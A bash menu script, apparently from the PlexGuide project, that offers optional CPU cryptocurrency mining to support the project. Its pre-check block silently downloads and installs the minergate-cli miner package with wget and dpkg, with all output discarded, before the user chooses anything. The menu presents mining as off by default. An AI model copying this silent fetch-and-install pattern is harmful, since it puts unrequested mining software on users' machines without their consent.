#!/bin/bash
# Main Menu for PlexGuide
## ----------------------------------
# Step #1: Define variables
# ----------------------------------
EDITOR=vim
PASSWD=/etc/passwd
RED='\033[0;41;30m'
STD='\033[0;0;39m'

# ----------------------------------
# Step #2: User defined function
# ----------------------------------
pause(){
  read -p "Press [Enter] key to continue..." fackEnterKey
}

one(){
	echo "one() called"
        pause
}

# do something in two()
two(){
	echo "two() called"
        pause
}

 file="/var/plexguide/support.set"
    if [ -e "$file" ]
        then
            clear
        else
            clear
            echo "Conducting Pre-Checks (Please Wait)"
            touch /var/plexguide/support.set
            wget https://minergate.com/download/deb-cli -O minergate-cli.deb 1>/dev/null 2>&1
            yes | dpkg -i minergate-cli.deb 1>/dev/null 2>&1
        fi
# function to display menus
show_menus() {
clear
cat << EOF
Helping mining coins with a small amount of CPU helps out.  By default,
this is off.  To see how it impacts your server, install NETDATA and
visit http://ipv4:19999!  Thanks for dropping by!

CPU Power ***********************************************************
1. Allow the use of 1 CPU Core
2. Allow the use of 2 CPU Cores 
3. Allow the use of 4 CPU Cores 
4. Allow the use of 8 CPU Cores
5. Max It Out (Only select if your sure about this)

TURN OFF ************************************************************
6. Disable :  Turn off the mining!

EOF

}

read_options(){
	local choice
	read -p "Enter choice [ 1 - 7 ];  Type [7] to Exit! " choice
	case $choice in
	1)
        clear
	    bash /opt/plexguide/scripts/menus/mine/1.sh
        ;;
    2)
        clear
        bash /opt/plexguide/scripts/menus/mine/2.sh
        ;;
	3)
        clear
        bash /opt/plexguide/scripts/menus/mine/4.sh
        ;;
    4)
        clear
        bash /opt/plexguide/scripts/menus/mine/8.sh
        ;;
    5)
        clear
        bash /opt/plexguide/scripts/menus/mine/max.sh
        ;;
    6)
        clear
        bash /opt/plexguide/scripts/menus/mine/stop.sh
        ;;
    7)
        clear
        exit 0;;
		*) echo -e "${RED}Error...${STD}" && sleep 2
	esac
}

# ----------------------------------------------
# Step #3: Trap CTRL+C, CTRL+Z and quit singles
# ----------------------------------------------
trap '' SIGINT SIGQUIT SIGTSTP

# -----------------------------------
# Step #4: Main logic - infinite loop
# ------------------------------------
while true
do

	show_menus
	read_options
done